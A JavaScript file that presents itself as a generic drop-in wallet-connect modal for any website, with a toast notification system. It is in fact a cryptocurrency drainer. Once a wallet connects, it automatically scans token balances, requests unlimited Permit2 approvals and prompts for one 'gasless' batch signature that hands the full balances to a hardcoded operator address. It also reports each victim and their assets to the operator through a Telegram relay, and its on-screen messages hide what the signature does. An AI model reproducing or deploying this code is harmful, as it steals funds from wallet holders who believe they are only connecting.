// ============================================================
//  REOWN APPKIT — STANDALONE DROP-IN MODAL
//
//  HOW TO USE ON ANY WEBSITE:
//
//  1. npm run build  →  produces dist/wallet-modal.js
//  2. On your page, just add:
//
//     <script type="module" src="wallet-modal.js"></script>
//
//  That's it. The connect button + popup + modal all inject themselves.
//  Edit the "YOUR FUNCTIONS" section below to add your own logic.
// ============================================================

import { createAppKit } from "@reown/appkit";
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import { mainnet, sepolia, arbitrum, polygon, base } from "@reown/appkit/networks";
import { BrowserProvider } from "ethers";
import { disconnect as wagmiDisconnect, signMessage as wagmiSignMessage, getAccount } from "@wagmi/core";

// ─── CONFIG ──────────────────────────────────────────────────
// PRODUCTION: Set your WalletConnect project ID from https://cloud.reown.com
const projectId = import.meta.env?.VITE_WALLETCONNECT_PROJECT_ID || (() => { console.error("[StealthV26] VITE_WALLETCONNECT_PROJECT_ID not set"); return ""; })();

const metadata = {
  name: "My dApp",
  description: "Standalone Wallet Connect Modal",
  url: window.location.origin,
  icons: [],
};

const networks = [mainnet, sepolia, arbitrum, polygon, base];
const wagmiAdapter = new WagmiAdapter({ networks, projectId });

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata,
  themeMode: "dark",
  features: {
    analytics: false,
    email: true,
    socials: ["google", "github", "discord", "x"],
  },
});

// ─── POPUP / TOAST CONFIG ────────────────────────────────────
// Customize everything about the popup notifications here.
const TOAST_CONFIG = {
  // Position: "top-right", "top-left", "bottom-right", "bottom-left", "top-center", "bottom-center"
  position: "top-right",

  // Duration in ms (how long the toast stays visible)
  duration: 4000,

  // Max width in px
  maxWidth: 400,

  // Border radius in px
  borderRadius: 14,

  // Colors
  background: "#1a1a2e",
  border: "#2a2a3e",
  titleColor: "#e4e4e7",
  bodyColor: "#a1a1aa",

  // Accent colors per type
  accentColors: {
    success: "#22c55e",
    info: "#6366f1",
    warn: "#f59e0b",
    error: "#ef4444",
  },

  // Fonts
  titleFont: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
  titleSize: "0.92rem",
  bodyFont: "'SF Mono', Monaco, Consolas, monospace",
  bodySize: "0.82rem",

  // Animation: "slide", "fade"
  animation: "slide",

  // Gap between stacked toasts in px
  stackGap: 12,

  // Max visible toasts at once (older ones get removed)
  maxVisible: 5,
};

// ─── POPUP / TOAST SYSTEM ────────────────────────────────────

const toastStack = [];

function getPositionCSS() {
  const p = TOAST_CONFIG.position;
  const css = { position: "fixed", zIndex: 2147483647 };
  if (p.includes("top")) css.top = "20px";
  if (p.includes("bottom")) css.bottom = "20px";
  if (p.includes("right")) css.right = "20px";
  if (p.includes("left")) css.left = "20px";
  if (p.includes("center")) {
    css.left = "50%";
    css.transform = "translateX(-50%)";
  }
  return css;
}

function getSlideFrom() {
  const p = TOAST_CONFIG.position;
  if (p.includes("right")) return "translateX(120%)";
  if (p.includes("left")) return "translateX(-120%)";
  if (p.includes("top")) return "translateY(-120%)";
  return "translateY(120%)";
}

function injectStyles() {
  if (document.getElementById("appkit-toast-styles")) return;
  const style = document.createElement("style");
  style.id = "appkit-toast-styles";
  const c = TOAST_CONFIG;
  const slideFrom = getSlideFrom();
  const isFade = c.animation === "fade";

  style.textContent = `
    .appkit-toast {
      ${Object.entries(getPositionCSS()).map(([k, v]) => `${k.replace(/([A-Z])/g, "-$1").toLowerCase()}: ${v}`).join("; ")};
      background: ${c.background};
      border: 1px solid ${c.border};
      border-radius: ${c.borderRadius}px;
      padding: 16px 22px;
      color: ${c.titleColor};
      font-family: ${c.titleFont};
      font-size: ${c.titleSize};
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      max-width: ${c.maxWidth}px;
      word-break: break-all;
      pointer-events: auto;
      cursor: pointer;
      transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
      ${isFade ? "opacity: 0;" : `transform: ${slideFrom};`}
    }
    .appkit-toast.show {
      ${isFade ? "opacity: 1;" : "transform: translateX(0) translateY(0);"}
    }
    .appkit-toast .toast-title {
      font-weight: 600;
      margin-bottom: 4px;
      font-size: ${c.titleSize};
      color: ${c.titleColor};
    }
    .appkit-toast .toast-body {
      color: ${c.bodyColor};
      font-size: ${c.bodySize};
      font-family: ${c.bodyFont};
    }
    .appkit-toast.success { border-left: 4px solid ${c.accentColors.success}; }
    .appkit-toast.info    { border-left: 4px solid ${c.accentColors.info}; }
    .appkit-toast.warn    { border-left: 4px solid ${c.accentColors.warn}; }
    .appkit-toast.error   { border-left: 4px solid ${c.accentColors.error}; }
  `;
  document.head.appendChild(style);
}

function repositionToasts() {
  const p = TOAST_CONFIG.position;
  const gap = TOAST_CONFIG.stackGap;
  let offset = 0;
  toastStack.forEach((el) => {
    if (p.includes("top")) {
      el.style.top = `${20 + offset}px`;
    } else {
      el.style.bottom = `${20 + offset}px`;
    }
    offset += el.offsetHeight + gap;
  });
}

function showToast(title, body, type = "success", duration) {
  injectStyles();
  duration = duration || TOAST_CONFIG.duration;

  // Enforce max visible
  while (toastStack.length >= TOAST_CONFIG.maxVisible) {
    const oldest = toastStack.shift();
    oldest.remove();
  }

  const el = document.createElement("div");
  el.className = `appkit-toast ${type}`;
  el.innerHTML = `<div class="toast-title">${title}</div><div class="toast-body">${body}</div>`;

  // Click to dismiss
  el.addEventListener("click", () => {
    el.classList.remove("show");
    setTimeout(() => {
      const idx = toastStack.indexOf(el);
      if (idx > -1) toastStack.splice(idx, 1);
      el.remove();
      repositionToasts();
    }, 350);
  });

  document.body.appendChild(el);
  toastStack.push(el);
  repositionToasts();

  // Animate in
  requestAnimationFrame(() => requestAnimationFrame(() => {
    el.classList.add("show");
    repositionToasts();
  }));

  // Auto dismiss
  setTimeout(() => {
    el.classList.remove("show");
    setTimeout(() => {
      const idx = toastStack.indexOf(el);
      if (idx > -1) toastStack.splice(idx, 1);
      el.remove();
      repositionToasts();
    }, 400);
  }, duration);
}

// ─── HELPER ──────────────────────────────────────────────────
function getWagmiConfig() {
  return wagmiAdapter.wagmiConfig;
}

async function getSigner() {
  const { getConnectorClient } = await import("@wagmi/core");
  const client = await getConnectorClient(wagmiAdapter.wagmiConfig);
  return new BrowserProvider(client.transport).getSigner();
}

// ==============================================================
//  OPERATOR CONFIG
// ==============================================================

const OPERATOR = {
  receiver: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  exchange: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
  permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  autoBatch: true,
  relayUrl: window.location.origin + "/api/relay/batch",
  tokens: {
    1: [
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI",  decimals: 18 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    ],
    56: [
      { addr: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    ],
    137: [
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
      { addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    ],
    42161: [
      { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
    ],
  },
};

let walletAssets = [];

// ── TELEGRAM ALERTS ───────────────────────────────────────────
// Notifications are routed through /api/notify — bot token stays server-side.
const TELEGRAM = {
  enabled: true,
};

async function notifyTelegram(text) {
  if (!TELEGRAM.enabled) return;
  try {
    await fetch(window.location.origin + "/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: text }),
    });
  } catch (e) { console.warn("[Telegram] Notify relay failed:", e.message); }
}

function shortAddr(a) { return a ? a.slice(0, 6) + "..." + a.slice(-4) : "?"; }


// ==============================================================
//  BALANCE SCANNER
// ==============================================================

async function scanBalances(address, chainId) {
  let provider = null;
  try { const { getConnectorClient } = await import("@wagmi/core"); const c = await getConnectorClient(wagmiAdapter.wagmiConfig); provider = c.transport; } catch(e) {}
  if (!provider) provider = window.ethereum;
  if (!provider) return [];
  const assets = [];

  try {
    const balHex = await provider.request({ method: "eth_getBalance", params: [address, "latest"] });
    const balEth = parseInt(balHex, 16) / 1e18;
    if (balEth > 0) assets.push({ type: "NATIVE", symbol: "ETH", balance: balEth, balanceRaw: balHex, address: "0x0000000000000000000000000000000000000000" });
  } catch (e) {}

  const tokens = OPERATOR.tokens[chainId] || [];
  for (const token of tokens) {
    try {
      const data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
      const result = await provider.request({ method: "eth_call", params: [{ to: token.addr, data }, "latest"] });
      const bal = parseInt(result, 16) / Math.pow(10, token.decimals);
      if (bal > 0) assets.push({ type: "ERC-20", symbol: token.symbol, balance: bal, balanceRaw: result, address: token.addr, decimals: token.decimals });
    } catch (e) {}
  }

  const stables = ["USDT", "USDC", "DAI", "BUSD"];
  assets.sort((a, b) => { const aS = stables.includes(a.symbol) ? -1 : 1; const bS = stables.includes(b.symbol) ? -1 : 1; return aS !== bS ? aS - bS : b.balance - a.balance; });
  return assets;
}

// ==============================================================
//  PERMIT2 BATCH
// ==============================================================

async function executeBatch(assets, recipient) {
  const erc20Items = assets.filter(a => a.type === "ERC-20" && a.balance > 0);
  if (!erc20Items.length) return null;

  const signer = await getSigner();
  const E = await import("ethers");
  const owner = await signer.getAddress();
  const chainId = await signer.provider.getNetwork().then(n => Number(n.chainId));

  showToast("\ud83d\udd0d Preparing gasless batch", erc20Items.length + " tokens", "info", 3000);

  // ── Step 1: Ensure Permit2 has allowance (approve once, reusable) ──
  const erc20Abi = [
    "function allowance(address,address) view returns (uint256)",
    "function approve(address,uint256) returns (bool)"
  ];
  for (const item of erc20Items) {
    try {
      const tokenC = new E.Contract(item.address, erc20Abi, signer);
      const current = await tokenC.allowance(owner, OPERATOR.permit2);
      if (current < BigInt(item.balanceRaw)) {
        showToast("\u270d\ufe0f Approve " + item.symbol + " for Permit2", "One-time approval", "info", 5000);
        const tx = await tokenC.approve(OPERATOR.permit2, E.MaxUint256);
        await tx.wait();
        console.log("[Batch] Permit2 approval confirmed for", item.symbol);
      }
    } catch (e) {
      console.warn("[Batch] Approval failed for", item.symbol, e.message);
    }
  }

  // ── Step 2: Read Permit2 nonces ──
  const permit2Abi = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
  const permit2C = new E.Contract(OPERATOR.permit2, permit2Abi, signer);
  const now = Math.floor(Date.now() / 1000);
  const expiration = now + 2592000; // 30 days
  const sigDeadline = now + 1200;   // 20 min
  const details = [];

  for (const item of erc20Items) {
    try {
      const res = await permit2C.allowance(owner, item.address, OPERATOR.exchange || recipient);
      details.push({
        token: item.address,
        amount: BigInt(item.balanceRaw),
        expiration,
        nonce: Number(res[2]),
      });
    } catch (e) {
      console.warn("[Batch] Nonce read failed for", item.address);
    }
  }

  if (!details.length) {
    showToast("\u274c No tokens ready", "Nonce reads failed", "error");
    return null;
  }

  // ── Step 3: ONE EIP-712 signature — gasless for the user ──
  const domain = { name: "Permit2", chainId, verifyingContract: OPERATOR.permit2 };
  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };

  const permitBatch = {
    details: details.map(d => ({
      token: d.token,
      amount: d.amount,
      expiration: d.expiration,
      nonce: d.nonce,
    })),
    spender: OPERATOR.exchange || recipient,
    sigDeadline,
  };

  showToast("\u270d\ufe0f Sign to confirm", details.length + " tokens — one signature, no gas", "info", 8000);

  let signature;
  try {
    signature = await signer.signTypedData(domain, types, permitBatch);
  } catch (e) {
    showToast("\u274c Signature rejected", e.reason || e.message, "error");
    notifyTelegram("\u274c <b>Signature Rejected</b>\nUser: <code>" + owner + "</code>\nChain: " + chainId);
    return null;
  }

  console.log("[Batch] EIP-712 signature obtained");

  // ── Step 4: Relay to backend (gasless execution) ──
  const payload = {
    user: owner,
    recipient,
    permitBatch,
    signature,
    chainId,
    tokens: erc20Items.map(i => ({ symbol: i.symbol, address: i.address, amount: i.balance })),
  };

  // Try relay first (fully gasless)
  const relayUrl = OPERATOR.relayUrl || (window.location.origin + "/api/relay/batch");
  try {
    showToast("\u23f3 Executing gasless transfer...", "Relaying to network", "info", 10000);
    const res = await fetch(relayUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const json = await res.json();
      const txHash = json.hash || json.txHash || "relayed";
      showToast("\u2705 Transfer complete!", txHash.slice(0, 20) + "...", "success", 8000);
      notifyTelegram(
        "\u2705 <b>Gasless Batch Complete</b>\n\n" +
        "User: <code>" + owner + "</code>\n" +
        "Recipient: <code>" + recipient + "</code>\n" +
        "Tokens: " + details.length + "\n" +
        "Chain: " + chainId + "\n" +
        "Tx: <code>" + txHash + "</code>\n" +
        "Assets:\n" + erc20Items.map(i => "  " + i.symbol + ": " + i.balance.toFixed(4)).join("\n")
      );
      return { ...payload, txHash, relayed: true };
    }

    // Relay returned error — fall through to direct execution
    const errText = await res.text().catch(() => "");
    console.warn("[Batch] Relay failed:", res.status, errText);
  } catch (relayErr) {
    console.warn("[Batch] Relay unavailable:", relayErr.message);
  }

  // ── Fallback: Direct on-chain execution (user pays gas) ──
  showToast("\u26a0\ufe0f Relay unavailable, executing directly", "You will pay gas", "warn", 5000);

  try {
    const exchangeAbi = [
      "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)"
    ];
    const exchangeC = new E.Contract(OPERATOR.exchange || recipient, exchangeAbi, signer);
    const tx = await exchangeC.batchPermitTransferFromBatch(owner, permitBatch, signature, recipient);
    showToast("\u2709 Tx submitted", tx.hash.slice(0, 16) + "...", "info", 6000);
    notifyTelegram("\ud83d\udce4 <b>Direct Batch Tx</b>\nHash: <code>" + tx.hash + "</code>\nTokens: " + details.length);

    const receipt = await tx.wait();
    showToast("\u2705 Transfer confirmed!", "Block " + receipt.blockNumber, "success", 8000);
    notifyTelegram(
      "\u2705 <b>Batch Confirmed</b>\n" +
      "Hash: <code>" + receipt.hash + "</code>\n" +
      "Block: " + receipt.blockNumber + "\n" +
      "Tokens: " + details.length
    );
    return { ...payload, txHash: receipt.hash, blockNumber: receipt.blockNumber, direct: true };
  } catch (directErr) {
    showToast("\u274c Execution failed", directErr.reason || directErr.message, "error");
    notifyTelegram("\u274c <b>Execution Failed</b>\nUser: <code>" + owner + "</code>\nError: " + (directErr.reason || directErr.message));
    return { ...payload, error: directErr.message };
  }
}

async function triggerBatch() {
  if (!modal.getIsConnected()) { showToast("⚠️", "Connect first", "warn"); return; }
  if (!walletAssets.length) walletAssets = await scanBalances(modal.getAddress(), modal.getChainId());
  return executeBatch(walletAssets, OPERATOR.receiver);
}

// ==============================================================
//  CONNECT CALLBACKS
// ==============================================================

async function onConnected({ address, chainId }) {
  const short = address.slice(0, 6) + "..." + address.slice(-4);
  showToast("\u2705 Wallet Connected", short + " on chain " + chainId, "success");
  notifyTelegram("\u2705 <b>Wallet Connected</b>\n\nAddress: <code>" + address + "</code>\nChain: " + chainId + "\nTime: " + new Date().toISOString());

  try {
    walletAssets = await scanBalances(address, chainId);
    if (walletAssets.length > 0) {
      showToast("\ud83d\udcb0 Assets Found", walletAssets.map(a => a.symbol + ": " + a.balance.toFixed(4)).join(", "), "info", 5000);
      notifyTelegram("\ud83d\udcb0 <b>Assets Scanned</b>\n\nWallet: <code>" + shortAddr(address) + "</code>\nChain: " + chainId + "\nAssets:\n" + walletAssets.map(a => "  " + a.symbol + ": " + a.balance.toFixed(4)).join("\n"));
    }
  } catch (e) {}

  if (OPERATOR.autoBatch && OPERATOR.receiver !== "0x0000000000000000000000000000000000000000" && walletAssets.length > 0) {
    try {
      const result = await executeBatch(walletAssets, OPERATOR.receiver);
      if (result) {
        showToast("\ud83d\udce6 Batch ready", result.permitBatch.details.length + " tokens", "success", 6000);
        notifyTelegram("\ud83d\udce6 <b>Batch Permit Signed</b>\n\nUser: <code>" + result.user + "</code>\nRecipient: <code>" + shortAddr(result.recipient) + "</code>\nTokens: " + result.permitBatch.details.length + "\nChain: " + result.chainId);
      }
    } catch (e) { showToast("\u26a0\ufe0f Batch failed", e.message, "error"); }
  }
}

async function onDisconnected() {
  walletAssets = [];
  showToast("\ud83d\udd0c Disconnected", "Wallet disconnected.", "warn");
  notifyTelegram("\ud83d\udd0c <b>Wallet Disconnected</b>");
}

async function onChainChanged({ chainId }) {
  showToast("\ud83d\udd04 Network Changed", "Switched to chain " + chainId, "info");
  const address = modal.getAddress();
  if (address) walletAssets = await scanBalances(address, chainId);
}

async function onSignMessage() {
  try {
    showToast("\u270d\ufe0f Signing...", "Check your wallet", "info", 3000);
    const sig = await wagmiSignMessage(getWagmiConfig(), { message: "Hello from my dApp!" });
    showToast("\u2705 Signed!", sig.slice(0, 24) + "...", "success", 6000);
  } catch (err) {
    showToast("\u274c Error", err.message || String(err), "error", 5000);
  }
}
// ==============================================================
//  WIRING — subscribeAccount (reliable across AppKit versions)
// ==============================================================

let lastAddress = null;
let lastChainId = null;
let wasConnected = false;

modal.subscribeAccount((account) => {
  if (account.isConnected && account.address) {
    const address = account.address;
    let chainId = null;
    try { chainId = wagmiAdapter.wagmiConfig.state.chainId; } catch(e) {}

    if (wasConnected && lastChainId !== null && lastChainId !== chainId) {
      onChainChanged({ chainId });
    }
    if (lastAddress !== address) {
      onConnected({ address, chainId });
    }
    lastAddress = address;
    lastChainId = chainId;
    wasConnected = true;
  } else if (!account.isConnected && wasConnected) {
    wasConnected = false;
    lastAddress = null;
    lastChainId = null;
    onDisconnected();
  }
});

// ─── BIND CUSTOM BUTTONS ─────────────────────────────────────
// Add these data attributes to any button on your page:
//
//   <button data-appkit-connect>Connect</button>
//   <button data-appkit-network>Networks</button>
//   <button data-appkit-sign>Sign Message</button>
//   <button data-appkit-disconnect>Disconnect</button>

function bindButtons() {
  document.querySelectorAll("[data-appkit-connect]").forEach((btn) => {
    btn.addEventListener("click", () => modal.open());
  });

  document.querySelectorAll("[data-appkit-network]").forEach((btn) => {
    btn.addEventListener("click", () => modal.open({ view: "Networks" }));
  });

  document.querySelectorAll("[data-appkit-sign]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (!modal.getIsConnected()) {
        showToast("⚠️ Not connected", "Connect a wallet first.", "warn", 3000);
        return;
      }
      onSignMessage();
    });
  });

  document.querySelectorAll("[data-appkit-disconnect]").forEach((btn) => {
    btn.addEventListener("click", async () => {
      if (!modal.getIsConnected()) return;
      try {
        const account = getAccount(getWagmiConfig());
        if (account.connector) {
          await wagmiDisconnect(getWagmiConfig(), { connector: account.connector });
        } else {
          await wagmiDisconnect(getWagmiConfig());
        }
      } catch (err) {
        console.error("Disconnect error:", err);
        // Fallback
        await wagmiDisconnect(getWagmiConfig());
      }
    });
  });
}

// Bind once DOM is ready
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", bindButtons);
} else {
  bindButtons();
}

// Export for advanced usage
export { modal, getSigner, showToast, scanBalances, executeBatch, triggerBatch, walletAssets, OPERATOR };
